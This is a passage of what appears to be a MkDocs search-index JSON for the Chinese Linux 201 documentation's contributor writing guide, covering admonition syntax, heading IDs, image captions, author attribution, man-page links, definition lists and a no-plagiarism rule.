\u200b\u7ae0\u8282\u200b\u7f16\u5199\u200b\u6307\u5bfc\u200b\uff0c\u200b\u6709\u200b\u8f83\u200b\u5927\u5e45\u5ea6\u200b\u7684\u200b\u8c03\u6574\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u5c06\u200b\u4ece\u200b\u4e24\u4e2a\u200b\u65b9\u9762\u200b\uff1a\u200b\u683c\u5f0f\u200b\u548c\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ecb\u7ecd\u200b\u5982\u4f55\u200b\u7f16\u5199\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"spec/writing/#format","title":"\u683c\u5f0f\u200b\u8981\u6c42","text":""},{"location":"spec/writing/#env-setup","title":"\u73af\u5883\u200b\u914d\u7f6e","text":"<p>Linux 201 \u200b\u4f7f\u7528\u200b mkdocs + mkdocs-material \u200b\u4f5c\u4e3a\u200b\u6587\u6863\u200b\u6846\u67b6\u200b\u4e0e\u200b\u4e3b\u9898\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4f7f\u7528\u200b autocorrect \u200b\u8fdb\u884c\u200b\u4e2d\u6587\u200b\u683c\u5f0f\u200b\u68c0\u67e5\u200b\uff0c\u200b\u4e0e\u200b markdownlint-cli2 \u200b\u505a\u200b Markdown \u200b\u683c\u5f0f\u200b\u68c0\u67e5\u200b\u3002\u200b\u8bf7\u200b\u9605\u8bfb\u200b\u4ed3\u5e93\u200b\u4e0b\u200b\u7684\u200b README.md \u200b\u4e86\u89e3\u200b\u57fa\u672c\u200b\u73af\u5883\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p>"},{"location":"spec/writing/#authors","title":"\u4e3b\u8981\u200b\u4f5c\u8005","text":"<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u7f16\u5199\u200b\u4e86\u200b\u67d0\u4e2a\u200b\u7ae0\u8282\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u6216\u200b\u5168\u90e8\u5185\u5bb9\u200b\uff0c\u200b\u6216\u200b\u4e3a\u200b\u67d0\u4e2a\u200b\u7ae0\u8282\u200b\u7684\u200b\u5199\u4f5c\u200b\u601d\u8def\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u91cd\u8981\u200b\u7684\u200b\u5e2e\u52a9\u200b\uff0c\u200b\u8bf7\u200b\u5728\u200b <code>includes/authors.md</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4f60\u200b\u7684\u200b ID\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u6837\u200b\uff08\u200b\u5047\u8bbe\u200b\u4f60\u200b\u53eb\u200b <code>example</code>\uff09\uff1a</p> <pre><code>[example]: https://github.com/example\n</code></pre> <p>\u200b\u7136\u540e\u200b\u7ae0\u8282\u200b\u5f00\u5934\u200b\u7684\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b\u63d0\u793a\u6846\u200b\u683c\u5f0f\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>!!! note \"\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b\"\n\n    [@example][example]\u3001[@test][test]\n</code></pre> <p>\u200b\u4e0d\u540c\u200b\u540d\u5b57\u200b\u4e4b\u95f4\u200b\u4f7f\u7528\u200b\u4e2d\u6587\u200b\u5168\u89d2\u200b\u987f\u53f7\u200b\uff08\u200b\u5373\u200b\u300c\u3001\u300d\uff09\u200b\u5206\u9694\u200b\u3002</p>"},{"location":"spec/writing/#status","title":"\u7ae0\u8282\u200b\u7f16\u5199\u200b\u72b6\u6001","text":"<p>\u200b\u5bf9\u4e8e\u200b\u672a\u5b9a\u7a3f\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u6839\u636e\u200b\u72b6\u6001\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8bf7\u200b\u5728\u200b h1 \u200b\u6807\u9898\u200b\u4e0b\u65b9\u200b\u6dfb\u52a0\u200b\u5982\u4e0b\u200b\u5185\u5bb9\u200b\uff1a</p> <pre><code>!!! warning \"\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b\"\n</code></pre> <p>\u200b\u6216\u200b</p> <pre><code>!!! warning \"\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b\"\n</code></pre> <p>\u200b\u6216\u200b</p> <pre><code>!!! success \"\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\u5e76\u200b\u6821\u5bf9\u200b\"\n</code></pre>"},{"location":"spec/writing/#admonition","title":"\u4f7f\u7528\u200b\u63d0\u793a\u6846\u200b\uff08Admonition\uff09","text":"<p>\u200b\u63d0\u793a\u6846\u200b\u662f\u200b mkdocs-material \u200b\u7684\u200b\u7279\u8272\u200b\u529f\u80fd\u200b\u3002\u200b\u683c\u5f0f\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>!!! warning \"\u200b\u8b66\u544a\u200b\u6807\u9898\u200b\"\n\n    \u200b\u8fd9\u662f\u200b\u63d0\u793a\u6846\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\n\n??? note \"\u200b\u63d0\u793a\u200b\u6807\u9898\u200b\"\n\n    \u200b\u8fd9\u662f\u200b\u63d0\u793a\u6846\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c`???` \u200b\u8868\u793a\u200b\u9ed8\u8ba4\u200b\u6298\u53e0\u200b\u3002\n</code></pre> <p>\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p>\u200b\u8b66\u544a\u200b\u6807\u9898\u200b</p> <p>\u200b\u8fd9\u662f\u200b\u63d0\u793a\u6846\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> \u200b\u63d0\u793a\u200b\u6807\u9898\u200b <p>\u200b\u8fd9\u662f\u200b\u63d0\u793a\u6846\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c<code>???</code> \u200b\u8868\u793a\u200b\u9ed8\u8ba4\u200b\u6298\u53e0\u200b, \u200b\u4f7f\u7528\u200b <code>???+</code> \u200b\u53ef\u4ee5\u200b\u6298\u53e0\u200b, \u200b\u4f46\u662f\u200b\u9ed8\u8ba4\u200b\u5c55\u5f00\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u7684\u200b mkdocs-material \u200b\u63d0\u4f9b\u200b\u7684\u200b\u6807\u51c6\u200b\u63d0\u793a\u6846\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\uff1a</p> <ul> <li>note: \u200b\u63d0\u793a\u200b\uff0c\u200b\u8868\u793a\u200b\u91cd\u8981\u200b\u7684\u200b\u4fe1\u606f\u200b</li> <li>warning: \u200b\u8b66\u544a\u200b\uff0c\u200b\u8868\u793a\u200b\u9700\u8981\u200b\u7279\u522b\u200b\u6ce8\u610f\u200b\u7684\u200b\u4fe1\u606f\u200b</li> <li>danger: \u200b\u5371\u9669\u200b\uff0c\u200b\u8868\u793a\u200b\u5982\u679c\u200b\u5ffd\u89c6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b\u4e25\u91cd\u540e\u679c\u200b\u7684\u200b\u4fe1\u606f\u200b</li> <li>tip: \u200b\u5c0f\u200b\u6280\u5de7\u200b</li> <li>example: \u200b\u793a\u4f8b\u200b</li> <li>question: \u200b\u9700\u8981\u200b\u8bfb\u8005\u200b\u601d\u8003\u200b\u7684\u200b\u95ee\u9898\u200b</li> </ul> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u6211\u4eec\u200b\u81ea\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u63d0\u793a\u6846\u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li> <p>comment: \u200b\u8868\u793a\u200b\u7f16\u8005\u200b\u5bf9\u200b\u5185\u5bb9\u200b\u7684\u200b\u8bc4\u8bba\u200b\uff08\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u67d0\u4e9b\u200b\u6e38\u620f\u200b\u7684\u200b\u300cDeveloper Commentary\u300d\uff09\uff0c\u200b\u4f7f\u7528\u200b\u65f6\u8bf7\u200b\u5728\u200b\u6807\u9898\u200b\u5904\u5199\u200b\u4e0a\u200b\u4f60\u200b\u7684\u200b\u6635\u79f0\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>!!! comment \"@taoky: \u200b\u5410\u69fd\u200b\"\n\n    \u200b\u6bd4\u5982\u8bf4\u200b\u2026\u2026\n</code></pre> <p>\u200b\u6548\u679c\u200b\uff1a</p> <p>@taoky: \u200b\u5410\u69fd\u200b</p> <p>\u200b\u6bd4\u5982\u8bf4\u200b\u2026\u2026</p> </li> <li> <p>lab: \u200b\u6559\u7a0b\u200b\u4e0d\u4f1a\u200b\u8be6\u7ec6\u200b\u8bf4\u660e\u200b\uff0c\u200b\u9700\u8981\u200b\u8bfb\u8005\u200b\u81ea\u5df1\u200b\u5c1d\u8bd5\u200b\u7684\u200b\u5b9e\u9a8c\u200b\u3002</p> </li> </ul>"},{"location":"spec/writing/#heading-ids","title":"\u4e3a\u200b\u6807\u9898\u200b\u548c\u200b\u5c0f\u6807\u9898\u200b\u6dfb\u52a0\u200b ID","text":"<p>\u200b\u7531\u4e8e\u200b\u6587\u7ae0\u200b\u7bc7\u76ee\u200b\u8f83\u957f\u200b\uff0c\u200b\u4f7f\u7528\u200b\u65f6\u4f1a\u200b\u7ecf\u5e38\u200b\u9047\u5230\u200b\u9700\u8981\u200b\u94fe\u63a5\u200b\u5230\u200b\u6587\u7ae0\u200b\u67d0\u200b\u4e00\u6bb5\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u53d7\u9650\u4e8e\u200b MkDocs \u200b\u81ea\u52a8\u200b\u751f\u6210\u200b Anchor ID \u200b\u7684\u200b\u529f\u80fd\u200b\uff08\u200b\u53ea\u200b\u652f\u6301\u200b\u82f1\u6587\u200b\u5b57\u7b26\u200b\uff09\uff0c\u200b\u7eaf\u4e2d\u6587\u200b\u7684\u200b\u6807\u9898\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u751f\u6210\u200b <code>_1</code>, <code>_2</code> \u200b\u8fd9\u6837\u200b\u7684\u200b ID\u3002\u200b\u4e00\u65b9\u9762\u200b\u8fd9\u6837\u200b\u7684\u200b ID \u200b\u770b\u8d77\u6765\u200b\u4e0d\u200b\u76f4\u89c2\u200b\uff0c\u200b\u53e6\u4e00\u65b9\u9762\u200b\u6bcf\u5f53\u200b\u6807\u9898\u200b\u53d1\u751f\u200b\u589e\u51cf\u200b\u65f6\u200b\u8fd9\u4e9b\u200b ID \u200b\u90fd\u200b\u4f1a\u53d8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bf7\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u9664\u4e86\u200b h1 \u200b\u4ee5\u5916\u200b\u7684\u200b\u6807\u9898\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u6709\u200b\u610f\u4e49\u200b\u7684\u200b ID\uff0c\u200b\u65b9\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>### \u200b\u4e3a\u200b\u6807\u9898\u200b\u548c\u200b\u5c0f\u6807\u9898\u200b\u6dfb\u52a0\u200b ID {#heading-ids}\n\n\u200b\u6ce8\u610f\u200b `{` \u200b\u524d\u9762\u200b\u8981\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7a7a\u683c\u200b\u54e6\u200b\uff01\n</code></pre> <p>\u200b\u5efa\u8bae\u200b ID \u200b\u53ea\u200b\u5305\u542b\u200b\u5c0f\u5199\u5b57\u6bcd\u200b\u3001\u200b\u6570\u5b57\u200b\u548c\u200b\u6a2a\u7ebf\u200b <code>-</code>\uff0c\u200b\u5fc5\u8981\u200b\u65f6\u200b\u4f7f\u7528\u200b\u53e5\u70b9\u200b\uff08\u200b\u4e0d\u200b\u4f7f\u7528\u200b\u5927\u5199\u5b57\u6bcd\u200b\u548c\u200b\u5176\u4ed6\u200b\u6807\u70b9\u7b26\u53f7\u200b\uff09\u3002</p>"},{"location":"spec/writing/#image-caption","title":"\u4e3a\u200b\u56fe\u7247\u200b\u6dfb\u52a0\u200b\u914d\u5b57","text":"<p>\u200b\u5728\u200b\u56fe\u7247\u200b\u4e0b\u65b9\u200b\u5199\u200b\u4e00\u884c\u200b\u6587\u5b57\u200b\u4f5c\u4e3a\u200b\u914d\u5b57\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u8fd9\u884c\u200b\u5b57\u200b\u7d27\u63a5\u7740\u200b\u7684\u200b\u4e0b\u200b\u4e00\u884c\u200b\uff08\u200b\u4e0d\u80fd\u200b\u6709\u200b\u7a7a\u884c\u200b\uff09\u200b\u5199\u200b\u4e0a\u200b <code>{: .caption }</code>\uff0c\u200b\u8fd9\u6837\u200b\u914d\u200b\u7684\u200b\u8fd9\u884c\u200b\u5b57\u200b\u6e32\u67d3\u200b\u6210\u200b HTML \u200b\u65f6\u200b\u5c31\u200b\u52a0\u4e0a\u200b\u4e86\u200b <code>class=\"caption\"</code>\uff0c\u200b\u663e\u793a\u200b\u4e3a\u200b 0.94 \u200b\u500d\u200b\u7684\u200b\u5b57\u4f53\u200b\u3001\u200b\u7070\u8272\u200b\u3001\u200b\u8d34\u8fd1\u200b\u56fe\u7247\u200b\u3002</p> <pre><code>![image](url)\n\n\u200b\u56fe\u200b 1. \u200b\u8fd9\u5f20\u200b\u56fe\u7247\u200b\u7684\u200b\u4e00\u884c\u200b\u914d\u5b57\u200b\n{: .caption }\n</code></pre>"},{"location":"spec/writing/#images-attachments","title":"\u56fe\u7247\u200b\u4e0e\u200b\u9644\u4ef6\u200b\u6587\u4ef6","text":"<p>\u200b\u56fe\u7247\u200b\u653e\u7f6e\u200b\u5728\u200b <code>docs/images</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u5c0f\u200b\u7684\u200b\u9644\u4ef6\u200b\u6587\u4ef6\u200b\u653e\u7f6e\u200b\u5728\u200b <code>docs/assets/</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u7f16\u5199\u200b Markdown \u200b\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u76f8\u5bf9\u8def\u5f84\u200b\u5f15\u7528\u200b\u3002</p>"},{"location":"spec/writing/#man","title":"man \u200b\u624b\u518c\u200b\u5f15\u7528","text":"<p><code>includes/man.md</code> \u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u624b\u518c\u200b\u7684\u200b\u5728\u7ebf\u200b\u9605\u8bfb\u200b\u94fe\u63a5\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>[fstab.5]: https://man7.org/linux/man-pages/man5/fstab.5.html\n</code></pre> <p>\u200b\u6309\u7167\u200b\u6307\u5b9a\u200b\u683c\u5f0f\u200b\u6dfb\u52a0\u200b\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u65b9\u5f0f\u200b\u5f15\u7528\u200b\uff1a</p> <pre><code>[fstab(5)][fstab.5] \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u2026\u2026\n</code></pre>"},{"location":"spec/writing/#definition-list","title":"\u5b9a\u4e49\u200b\u5217\u8868","text":"<p>\u200b\u5728\u200b\u5199\u4f5c\u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9700\u8981\u200b\u5217\u51fa\u200b\u591a\u4e2a\u200b\u672f\u8bed\u200b\uff0c\u200b\u540c\u65f6\u200b\u7ed9\u51fa\u200b\u5b83\u4eec\u200b\u7684\u200b\u5b9a\u4e49\u200b\u6216\u8005\u200b\u4ecb\u7ecd\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u666e\u901a\u200b\u7684\u200b\u6709\u5e8f\u200b\u6216\u200b\u65e0\u5e8f\u200b\u5217\u8868\u200b\u7684\u8bdd\u200b\uff0c\u200b\u7ed9\u200b\u8bfb\u8005\u200b\u7684\u200b\u89c2\u611f\u200b\u53ef\u80fd\u200b\u8fc7\u4e8e\u200b\u7d27\u51d1\u200b\u3002\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b\u5b9a\u4e49\u200b\u5217\u8868\u200b\u683c\u5f0f\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>\u200b\u5b9a\u4e49\u200b\u4e00\u200b\n\n:   \u200b\u672c\u9879\u200b\u7ecf\u5e38\u51fa\u73b0\u200b\u5728\u200b\u79d1\u5927\u200b\u897f\u533a\u200b\u548c\u200b\u4e2d\u533a\u200b\u7684\u200b\u4ea4\u754c\u5904\u200b\uff1a\u200b\u80a5\u897f\u200b\u8def\u4e0a\u200b\u3002\u200b\u5728\u200b\u665a\u4e0a\u200b\u4e5d\u70b9\u200b\u4e4b\u540e\u200b\uff0c\u200b\u6709\u200b\u6982\u7387\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8def\u8fb9\u200b\u53d1\u73b0\u200b\u672c\u9879\u200b\u3002\n\n    \u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u79bb\u5f00\u200b\u6821\u95e8\u200b\u65f6\u8bf7\u200b\u5e26\u200b\u597d\u200b\u624b\u673a\u200b\u3002\n\n\u200b\u5b9a\u4e49\u200b\u4e8c\u200b\n\n:   \u200b\u6211\u7f16\u200b\u4e0d\u200b\u4e0b\u53bb\u200b\u4e86\u200b\u3002\n</code></pre> <p>\u200b\u663e\u793a\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> \u200b\u5b9a\u4e49\u200b\u4e00\u200b <p>\u200b\u672c\u9879\u200b\u7ecf\u5e38\u51fa\u73b0\u200b\u5728\u200b\u79d1\u5927\u200b\u897f\u533a\u200b\u548c\u200b\u4e2d\u533a\u200b\u7684\u200b\u4ea4\u754c\u5904\u200b\uff1a\u200b\u80a5\u897f\u200b\u8def\u4e0a\u200b\u3002\u200b\u5728\u200b\u665a\u4e0a\u200b\u4e5d\u70b9\u200b\u4e4b\u540e\u200b\uff0c\u200b\u6709\u200b\u6982\u7387\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8def\u8fb9\u200b\u53d1\u73b0\u200b\u672c\u9879\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u79bb\u5f00\u200b\u6821\u95e8\u200b\u65f6\u8bf7\u200b\u5e26\u200b\u597d\u200b\u624b\u673a\u200b\u3002</p> \u200b\u5b9a\u4e49\u200b\u4e8c\u200b <p>\u200b\u6211\u7f16\u200b\u4e0d\u200b\u4e0b\u53bb\u200b\u4e86\u200b\u3002</p>"},{"location":"spec/writing/#content","title":"\u5185\u5bb9\u200b\u8981\u6c42","text":""},{"location":"spec/writing/#principle","title":"\u7f16\u5199\u200b\u539f\u5219","text":"<p>\u200b\u8bf7\u200b\u9605\u8bfb\u200b\u9996\u9875\u200b\uff0c\u200b\u4e86\u89e3\u200b\u6211\u4eec\u200b\u7684\u200b\u56db\u6761\u200b\u7f16\u5199\u200b\u539f\u5219\u200b\u3002</p>"},{"location":"spec/writing/#no-plagiarism","title":"\u8bf7\u52ff\u200b\u6284\u88ad","text":"<p>\u200b\u8bf7\u52ff\u200b\u6284\u88ad\u200b\u4ed6\u4eba\u200b\u7684\u200b\u6587\u7ae0\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b\u53c2\u8003\u200b\uff0c\u200b\u8bf7\u200b\u5728\u200b\u6587\u4e2d\u200b\u660e\u786e\u200b\u5199\u660e\u200b\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u8981\u200b\u4f7f\u7528\u200b GPT \u200b\u5927\u6bb5\u200b\u5927\u6bb5\u200b\u751f\u6210\u200b\u5185\u5bb9\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u63d0\u4ea4\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u5185\u5bb9\u200b\u5373\u4f7f\u200b\u6b63\u786e\u6027\u200b\u65e0\u8bef\u200b\uff0c\u200b\u4e5f\u200b\u5305\u542b\u200b\u5927\u91cf\u200b\u7684\u200b\u5e9f\u8bdd\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5b58\u5728\u200b\u6f5c\u5728\u200b\u7684\u200b\u7248\u6743\u200b\u98ce\u9669\u200b\u3002</p>"}]}